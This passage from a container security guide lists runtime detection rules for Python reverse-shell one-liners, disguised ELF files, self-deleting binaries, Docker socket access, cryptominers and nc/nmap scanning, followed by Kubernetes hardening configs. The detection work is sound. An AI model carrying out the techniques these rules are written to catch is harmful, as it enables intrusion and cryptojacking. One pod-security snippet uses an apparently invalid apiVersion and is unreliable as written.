mitigation: Implement symlink restrictions
```

### suspicious python execution

```yaml
rule: python_one_liner_execution
description: Python one-liner command execution
severity: MEDIUM
condition: |
  process.name == "python3" AND
  process.cmdline CONTAINS "-c" AND
  (process.cmdline CONTAINS "import socket" OR 
   process.cmdline CONTAINS "import subprocess" OR
   process.cmdline CONTAINS "base64.b64decode")
false_positives: DevOps scripts, automation
mitigation: Restrict Python execution in containers
```

### file execution with misleading execution

```yaml
rule: binary_misleading_extension
description: Execution of binary with misleading file extension
severity: MEDIUM
condition: |
  process.file.path MATCHES ".*\.py$" AND
  process.file.type == "ELF"
false_positives: Low - non-standard build artifacts
mitigation: Implement execution control based on file content
```

### self-deleting executables

```yaml
rule: self_deleting_executable
description: Process deletes its own executable after running
severity: HIGH
condition: |
  process.file.deletion AND
  process.file.path == process.executable.path
false_positives: Some installers, self-updating binaries
mitigation: Implement file deletion monitoring
```

### docker socket access

```yaml
rule: docker_socket_access_from_container
description: Container accessing Docker socket
severity: CRITICAL
condition: |
  process.file.path == "/var/run/docker.sock" OR
  container.volume_mount.source == "/var/run/docker.sock"
false_positives: Docker management tools
mitigation: Never mount Docker socket into containers
```

### cryptomining

```yaml
rule: crypto_mining_operation
description: Cryptocurrency mining process detected
severity: HIGH
condition: |
  process.name IN ["xmrig", "xmx2"] OR
  process.cmdline CONTAINS "--donate-level" OR
  (process.cpu.percent > 90 AND process.duration > 300)
false_positives: CPU-intensive legitimate workloads
mitigation: Implement resource limits for containers
```

### anomalous network traffic

```yaml
rule: anomalous_network_scanning
description: Network port scanning from container
severity: MEDIUM
condition: |
  process.name IN ["nc", "nmap", "netcat"] AND
  network.connection_count > 15 AND
  network.unique_destination_ports > 10
false_positives: Network troubleshooting
mitigation: Implement NetworkPolicy to restrict pod communications
```

### recommendations

enforce k8s pod security standards in "restricted" mode.

```yaml
   apiVersion: pod-security.admission.kubernetes.io/enforce
   kind: PodSecurityConfiguration
   defaults:
     enforce: "restricted"
```

consider disabling auto-mounting and using bound tokens.

```yaml
   automountServiceAccountToken: false
```

restrict egress traffic.

```yaml
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: default-deny-egress
   spec:
     podSelector: {}
     policyTypes:
     - Egress
     egress:
     - to:
       - namespaceSelector:
           matchLabels:
             kubernetes.io/metadata.name: kube-system
```

reject privileged workloads.

```yaml
   apiVersion: admissionregistration.k8s.io/v1
   kind: ValidatingAdmissionPolicy
   metadata:
     name: restrict-privileged
   spec:
     failurePolicy: Fail
     validations:
       - expression: "object.spec.containers.all(c, !c.securityContext.privileged || c.securityContext.privileged == false)"
```





